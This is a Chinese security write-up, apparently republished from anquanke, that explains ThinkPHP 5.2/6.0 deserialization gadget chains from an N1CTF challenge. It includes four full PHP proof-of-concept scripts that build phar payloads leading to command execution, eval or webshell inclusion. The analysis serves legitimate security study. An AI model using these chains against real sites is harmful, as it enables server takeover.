# Thinkphp 利用链

阅读量 **1039947**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-10-01 11:03:15

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t011b2dad3fd67bece8.jpg)

## 背景

在N1CTF中，Smi1e师傅出了一道thinkphp的反序列化链挖掘的题目，当时没有做出来，赛后复盘各位师傅的利用链学习总结。

## 安装

使用composer来部署环境

    
    
    composer create-project topthink/think=5.2.x-dev v5.2
    composer create-project topthink/think=6.0.x-dev v6.0

## 正文

一般来说，反序列化的入口为

__destruct析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行

__wakeupunserialize()执行前会检查是否存在一个__wakeup()方法，如果存在会先调用

__toString 当一个对象被反序列化后又被当做字符串使用

总的调用过程：

    
    
    Attribute.php:480, think\model\Pivot->getValue()
    Attribute.php:457, think\model\Pivot->getAttr()
    Conversion.php:173, think\model\Pivot->toArray()
    Conversion.php:252, think\model\Pivot->toJson()
    Conversion.php:268, think\model\Pivot->__toString()
    Windows.php:163, file_exists()
    Windows.php:163, think\process\pipes\Windows->removeFiles()
    Windows.php:59, think\process\pipes\Windows->__destruct()

最后在getValue()处进行可变函数调用导致RCE

## 5.2.x （一）

根据Smi1e师傅的POC

    
    
    <?php
    namespace think\process\pipes {
        class Windows
        {
            private $files;
            public function __construct($files)
            {
                $this->files = array($files);
            }
        }
    }
    ​
    namespace think\model\concern {
        trait Conversion
        {
            protected $append = array("Smi1e" => "1");
        }
    ​
        trait Attribute
        {
            private $data;
            private $withAttr = array("Smi1e" => "system");
    ​
            public function get($system)
            {
                $this->data = array("Smi1e" => "$system");
            }
        }
    }
    namespace think {
        abstract class Model
        {
            use model\concern\Attribute;
            use model\concern\Conversion;
        }
    }
    ​
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
            public function __construct($system)
            {
                $this->get($system);
            }
        }
    }
    ​
    namespace {
        $Conver = new think\model\Pivot("ls");
        $payload = new think\process\pipes\Windows($Conver);
        @unlink("phar3.phar");
        $phar = new Phar("phar3.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
        $phar->setMetadata($payload); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($payload));
    }
    ?>

调试环境：

    
    
    tp5.2.0rc1
    php7.3
    xdebug2.7.0

调试过程：

首先根据POC生成phar文件，放入public目录，在index.php中增加以下语句来触发反序列化，关于什么方法可以触发反序列化可以参考以下两篇文章，讲得很详细了，由于复现的时候题目环境已经关闭因此在这里我是自己构造的反序列化触发，预期解是通过Rogue
Mysql Server让其执行LOAD DATA LOCAL INFILE语句即可触发phar反序列化。

    
    
    <https://xz.aliyun.com/t/2958>
    <https://paper.seebug.org/998/>
    <https://xz.aliyun.com/t/6057#toc-6>

![](https://p5.ssl.qhimg.com/t01ef04573960aa3a17.png)

首先进入

Windows.php:59, think\process\pipes\Windows->__destruct()

![](https://p2.ssl.qhimg.com/t012f62a994a0d07063.png)

调用removeFiles()方法

Windows.php:163, think\process\pipes\Windows->removeFiles()

![](https://p4.ssl.qhimg.com/t015a2a4e53789b2396.png)

因为$this->files是Windows类中的一个private变量，我们可以通过重写Windows的__construct函数来控制该参数

调用file_exists()方法

Windows.php:163, file_exists()

此处使用file_exists来判断$filename是否存在，在file_exists中，$filename会被当作string类型处理。

![](https://p1.ssl.qhimg.com/t0178ffbd6a1e589f0d.png)

如果我们构造的Windows类中的$files为一个包含__toString()方法的对象，该__toString()方法将会被调用。

调用__toString()方法

Conversion.php:268, think\model\Pivot->__toString()

![](https://p2.ssl.qhimg.com/t01e4ecffec1258d29e.png)

调用toJson()方法

Conversion.php:252, think\model\Pivot->toJson()

![](https://p1.ssl.qhimg.com/t01f8b3442ca254ab72.png)

调用toArray()方法

Conversion.php:129, think\model\Pivot->toArray()

![](https://p2.ssl.qhimg.com/t0119dc92347ba77574.png)

其中$this->data和$this->relation都是数组类型，通过

![](https://p1.ssl.qhimg.com/t017fec3baea227d5e8.png)

array_merge以后得到$data为

![](https://p2.ssl.qhimg.com/t01b67ea275d2083ca8.png)

![](https://p5.ssl.qhimg.com/t01e9e4c16e693fc1ff.png)

$item[$key]的值为getAttr($key)的值

调用getAttr()方法

Attribute.php:450, think\model\Pivot->getAttr()

![](https://p1.ssl.qhimg.com/t013e35edeaadb0ae08.png)

$value的值通过getData($name)也就是getData(“Smile”)

调用getData()方法

Attribute.php:268, think\model\Pivot->getData()

![](https://p0.ssl.qhimg.com/t01da623e961bc37d70.png)

调用getRealFieldName方法

Attribute.php:179, think\model\Pivot->getRealFieldName()

![](https://p0.ssl.qhimg.com/t0115a316d67f90ebe6.png)

![](https://p0.ssl.qhimg.com/t01415699e45ee3aa85.png)

$this->strict为判断是否严格字段大小写的标志，默认为true

因此getRealFieldName默认返回$name参数的值

![](https://p5.ssl.qhimg.com/t01350aa1e231d4fcd0.png)

![](https://p3.ssl.qhimg.com/t01ba88c9f1ec7dc74e.png)

如果$this->data存在$fieldName键名，则返回对应的键值，此处为”ls”

![](https://p2.ssl.qhimg.com/t01fd9e00252f6837f6.png)

调用getValue()

Attribute.php:472, think\model\Pivot->getValue()

![](https://p5.ssl.qhimg.com/t019622757a1f26f13d.png)

withAttr的值是可控的

    
    
    trait Attribute
        {
            private $data;
            private $withAttr = array("Smi1e" => "system");
    ​
            public function get($system)
            {
                $this->data = array("Smi1e" => "$system");
            }
        }

![](https://p3.ssl.qhimg.com/t01fccb3c344ac2a147.png)

因此$closure的值可控，设置为system

然后进行可变函数调用

    
    
    system ( string $command [, int &$return_var ] ) : string

验证一下：

![](https://p4.ssl.qhimg.com/t01c592d36fdbd12ae8.png)

结果验证：

![](https://p0.ssl.qhimg.com/t0164aaebf80bf1e2da.png)

    
    
    $closure = $this->withAttr[$fieldName];
    $value   = $closure($value, $this->data);

第一个POC需要寻找一个可以接受两个参数的php函数比如system，而且需要想办法去控制这两个参数

## 5.2.x （二）

    
    
    <?php
    ​
    namespace think\process\pipes {
        class Windows{
            private $files = [];
            function __construct($files)
            {
                $this->files = $files;
            }
        }
    }
    ​
    namespace think\model\concern {
        trait Conversion{
            protected $visible;
        }
        trait RelationShip{
            private $relation;
        }
        trait Attribute{
            private $withAttr;
            private $data;
        }
    }
    ​
    namespace think {
        abstract class Model{
            use model\concern\RelationShip;
            use model\concern\Conversion;
            use model\concern\Attribute;
            function __construct($closure)
            {
                $this->data = array("wh1t3p1g"=>[]);
                $this->relation = array("wh1t3p1g"=>[]);
                $this->visible= array("wh1t3p1g"=>[]);
                $this->withAttr = array("wh1t3p1g"=>$closure);
            }
        }
    }
    ​
    namespace think\model {
        class Pivot extends \think\Model{
            function __construct($closure)
            {
                parent::__construct($closure);
            }
        }
    }
    ​
    namespace {
        require __DIR__ . '/../vendor/autoload.php';
        $code = 'phpinfo();';
        $func = function () use ($code) {eval($code);};
        $closure = new \Opis\Closure\SerializableClosure($func);
        $pivot = new \think\model\Pivot($closure);
        $windows = new \think\process\pipes\Windows([$pivot]);
        @unlink("phar4.phar");
        $phar = new Phar("phar4.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
        $phar->setMetadata($windows); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($windows));
    }
    ?>

这个POC是wh1t3p1g师傅找到的，跟第一个链的调用链其实是一样的

    
    
    SerializableClosure.php:109, Opis\Closure\SerializableClosure->__invoke()
    Attribute.php:481, think\model\Pivot->getValue()
    Attribute.php:457, think\model\Pivot->getAttr()
    Conversion.php:171, think\model\Pivot->toArray()
    Conversion.php:252, think\model\Pivot->toJson()
    Conversion.php:268, think\model\Pivot->__toString()
    Windows.php:163, file_exists()
    Windows.php:163, think\process\pipes\Windows->removeFiles()
    Windows.php:59, think\process\pipes\Windows->__destruct()

不同的是这一POC使用vendor/opis/closure/src/SerializableClosure.php来构造可利用的匿名函数，避开特定参数的构造，\Opis\Closure可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。

在中有__invoke()函数并且里面有call_user_func函数，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。

    
    
    call_user_func_array($this->closure, func_get_args());

这意味着我们可以序列化一个匿名函数，然后交由上述的$closure($value,
$this->data)调用，将会触发SerializableClosure.php的__invoke执行。

这个思路很赞！！！

## 5.2.x （三）

这个利用链在Attribute.php:472,
think\model\Pivot->getValue()之前的利用链都是相同的，如果能另外的利用链可以顺着参考文章第三篇的思路进行发掘，寻找一个类满足以下2个条件

  1. 该类中没有”visible”方法
  2. 实现了__call方法

这样才可以触发__call方法，那么直接搜索关键字public function
__call，因为一般PHP中的__call方法都是用来进行容错或者是动态调用，所以一般会在__call方法中使用

    
    
    __call_user_func($method, $args)
    __call_user_func_array([$obj,$method], $args)

但是public function __call($method, $args)我们只能控制
$args，在参考文章三中找到了think-5.1.37/thinkphp/library/think/Request.php，但是5.2.x不适用，重新寻找

![](https://p4.ssl.qhimg.com/t015baa78a78914871c.png)

\think\Db->__call()

在\think\Db.php中存在__call方法，其中会调用call_user_func_array来进行容错

$this->config和$this->connection均可控，至此，我们可以实例化任意符合条件的类，比如

    
    
    class Db{
    ​
            protected $config = [];
            protected $connection;
    ​
            function __construct($connection){
                $this->config["query"] = "\\think\\Url";
                $this->connection = $connection;
            }
        }

\think\Url

寻找一个存在漏洞的类

    
    
    public function __construct(App $app, array $config = [])
    {
        $this->app    = $app;
        $this->config = $config;
    ​
        if (is_file($app->getRuntimePath() . 'route.php')) {
            // 读取路由映射文件
            $app->route->import(include $app->getRuntimePath() . 'route.php');
        }
    }

在\think\Url.php中该构造器引入了RuntimePath下的route.php文件，因为这道题是允许上传文件的，所以只要在可上传的目录下上传一个route.php的webshell即可。

$app为可控变量，直接修改$runtimePath的内容即可控制$app->getRuntimePath()的值

因此如下构造App对象

    
    
    class App{
    ​
        protected $runtimePath;
        public function __construct(string $rootPath = ''){
            $this->rootPath = $rootPath;
            $this->runtimePath = "/tmp/";
            $this->route = new \think\route\RuleName();
        }

这个思路也很赞啊！！！！师傅们太强了。

  1. vendor/topthink/framework/src/think/process/pipes/Windows.php __destruct ->removeFiles ->file_exists 强制转化字符串filename，这里的filename可控 可触发__toString函数，下一步找可利用的__toString
  2. vendor/topthink/framework/src/think/model/concern/Conversion.php__toString -> toJson -> toArray->appendAttrToArray->$relation调用不存在的函数，触发__call
  3. vendor/topthink/framework/src/think/Db.php__call -> new $class($this->connection) 调用任意类的__construct函数
  4. vendor/topthink/framework/src/think/Url.php构造App类，达到include任意文件的效果

POC：

    
    
    <?php
    ​
    namespace think\route {
        class RuleName{
    ​
        }
    ​
    }
    ​
    namespace think{
    ​
        class App{
    ​
            protected $runtimePath;
            public function __construct(string $rootPath = ''){
                $this->rootPath = $rootPath;
                $this->runtimePath = "/tmp/";
                $this->route = new \think\route\RuleName();
    ​
            }
        }
    ​
        class Db{
    ​
            protected $config = [];
            protected $connection;
    ​
            function __construct($connection){
                $this->config["query"] = "\\think\\Url";
                $this->connection = $connection;
            }
        }
    ​
    }
    ​
    ​
    namespace think\process\pipes {
    ​
        class Windows{
            private $files ;
            private $fileHandles = [];
    ​
            function __construct($files){
                $this->files = $files;
            }
        }
    }
    ​
    namespace think\model\concern{
        trait Conversion{
            protected $visible ;
            protected $hidden ;
            private $data ;
            private $relation ;
            protected $append ;
        }
    ​
    }
    namespace think{
    ​
        abstract class Model{
            use  \think\model\concern\Conversion ;
            public function __construct($relation){
                $this->visible = array('t'=>"fuck");
                $this->hidden = [];
                $this->data = [];
                $this->relation = array("x"=>$relation); 
                $this->append = array("x"=>array());
            }
        }
    ​
    }
    ​
    ​
    namespace think\model {
        class Pivot extends \think\Model{
            public function __construct($relation){
                parent::__construct($relation);
            }
        }
    }
    ​
    namespace {
        $connection = new \think\App();
        $relation = new \think\Db($connection);
        $pivot = new \think\model\Pivot($relation);
        $files = array("0"=>$pivot);
        $window = new \think\process\pipes\Windows($files);
        @unlink("phar5.phar");
        $phar = new Phar('phar5.phar');
        $phar -> startBuffering();
        $phar -> setStub('<?php __HALT_COMPILER();?>');   //设置stub，增加gif文件头
        $phar ->addFromString('test.txt','test');  //添加要压缩的文件
        $phar -> setMetadata($window);  //将自定义meta-data存入manifest
        $phar -> stopBuffering();
    }

这个POC的利用限制较大，不过思路很赞

    
    
    Url.php:43, think\Url->__construct()
    Db.php:203, think\Db->__call()
    Conversion.php:196, think\Db->append()
    Conversion.php:196, think\model\Pivot->appendAttrToArray()
    Conversion.php:179, think\model\Pivot->toArray()
    Conversion.php:252, think\model\Pivot->toJson()
    Conversion.php:268, think\model\Pivot->__toString()
    Windows.php:163, file_exists()
    Windows.php:163, think\process\pipes\Windows->removeFiles()
    Windows.php:59, think\process\pipes\Windows->__destruct()

调试过程：

在调用toarray之前的步骤和前面两个POC的调用是一样的

    
    
    Conversion.php:179, think\model\Pivot->toArray()
    Conversion.php:252, think\model\Pivot->toJson()
    Conversion.php:268, think\model\Pivot->__toString()
    Windows.php:163, file_exists()
    Windows.php:163, think\process\pipes\Windows->removeFiles()
    Windows.php:59, think\process\pipes\Windows->__destruct()

之后开始调用appendAttrToArray()

Conversion.php:196, think\model\Pivot->appendAttrToArray()

![](https://p0.ssl.qhimg.com/t01296e62411ac3edbf.png)

Conversion.php:196, think\Db->append()

Db对象尝试调用append方法，因为Db不存在append方法所以会触发__call()

Db.php:201, think\Db->__call()

![](https://p5.ssl.qhimg.com/t012eec5bcccfd21773.png)

    
    
    $query = new $class($this->connection);

Url.php:44, think\Url->__construct()

![](https://p2.ssl.qhimg.com/t0194dea1cfec05b980.png)

![](https://p1.ssl.qhimg.com/t0138460badd622aa33.png)

## 6.0.x （四）

tp在v6.0.x取消了Windos类，但是前面的利用链的函数动态调用的反序列化链后半部分仍然可以使用，意思是得寻找新的起点，从__destruct和__wakeup等等开始找起。

    
    
    <?php
    /**
     * Created by PhpStorm.
     * User: wh1t3P1g
     */
    ​
    ​
    namespace think\model\concern {
        trait Conversion{
            protected $visible;
        }
    ​
        trait RelationShip{
            private $relation;
        }
    ​
        trait Attribute{
            private $withAttr;
            private $data;
            protected $type;
        }
    ​
        trait ModelEvent{
            protected $withEvent;
        }
    ​
    }
    ​
    namespace think {
        abstract class Model{
            use model\concern\RelationShip;
            use model\concern\Conversion;
            use model\concern\Attribute;
            use model\concern\ModelEvent;
    ​
            private $lazySave;
            private $exists;
            private $force;
            protected $connection;
            protected $suffix;
    ​
            function __construct($obj, $closure)
            {
                if($obj == null){
                    $this->data = array("wh1t3p1g"=>[]);
                    $this->relation = array("wh1t3p1g"=>[]);
                    $this->visible= array("wh1t3p1g"=>[]);
                    $this->withAttr = array("wh1t3p1g"=>$closure);
                }else{
                    $this->lazySave = true;
                    $this->withEvent = false;
                    $this->exists = true;
                    $this->force = true;
                    $this->data = array("wh1t3p1g"=>[]);
                    $this->connection = "mysql";
                    $this->suffix = $obj;
                }
    ​
            }
        }
    ​
    }
    ​
    namespace think\model {
        class Pivot extends \think\Model{
    ​
            function __construct($obj, $closure)
            {
                parent::__construct($obj, $closure);
            }
        }
    }
    ​
    namespace {
        require __DIR__ . '/../vendor/autoload.php';
        $code = 'phpinfo();';
        $func = function () use ($code) {eval($code);};
        $closure = new \Opis\Closure\SerializableClosure($func);
        $pivot1 = new \think\model\Pivot(null,$closure);
        $pivot2 = new \think\model\Pivot($pivot1,$closure);
        @unlink("phar6.phar");
        $phar = new Phar("phar6.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
        $phar->setMetadata($pivot2); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($pivot2));
    }

找一条可以触发toString的路径即可，在Model.php:503, think\model\Pivot->checkAllowFields()中

    
    
    protected function checkAllowFields(): array
    {
        // 检测字段
        if (empty($this->field)) {
            if (!empty($this->schema)) {
                $this->field = array_keys(array_merge($this->schema, $this->jsonType));
            } else {
                $query = $this->db();// 最终的触发__toString的函数
                $table = $this->table ? $this->table . $this->suffix : $query->getTable();
    ​
                $this->field = $query->getConnection()->getTableFields($table);
            }
    ​
            return $this->field;
        }
            // ...
    }

调用链如下，可以看到只是前半部分的调用链不一样，后面的利用__toString做跳板的调用链是一样的，太强了思路

    
    
    SerializableClosure.php:109, Opis\Closure\SerializableClosure->__invoke()
    Attribute.php:497, think\model\Pivot->getValue()
    Attribute.php:470, think\model\Pivot->getAttr()
    Conversion.php:173, think\model\Pivot->toArray()
    Conversion.php:244, think\model\Pivot->toJson()
    Conversion.php:249, think\model\Pivot->__toString()
    Model.php:297, think\model\Pivot->db()
    Model.php:503, think\model\Pivot->checkAllowFields()
    Model.php:559, think\model\Pivot->updateData()
    Model.php:474, think\model\Pivot->save()
    Model.php:978, think\model\Pivot->__destruct()

![](https://p5.ssl.qhimg.com/t01633e9b6838ac9497.png)

## 总结

有同学可能会疑问，找利用链之后怎么用呢，找到利用链只是一部分，还需要满足以下条件：

  1. 存在含有payload的phar文件，上传或者远程下载都可以。
  2. 存在反序列化的操作，这些操作不单单是unserialize还可以是文章中提到的包括LOAD DATA LOCAL INFILE等操作。

通过这四个POP的构造，也对thinkphp框架加深了理解，可以尝试尝试自己挖掘新的POP链~

## 参考

  1. <https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage>
  2. <https://github.com/opis/closure>
  3. [https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/?from=timeline&isappinstalled=0](https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/?from=timeline&isappinstalled=0)
  4. <http://blog.0kami.cn/2019/09/10/thinkphp-6-0-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Mote** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/187819](/post/id/187819)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [ThinkPHP](/tag/ThinkPHP)

 **+1** __22赞

 __收藏

![](https://p3.ssl.qhimg.com/t01a83c583f59eea32a.png) Mote

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

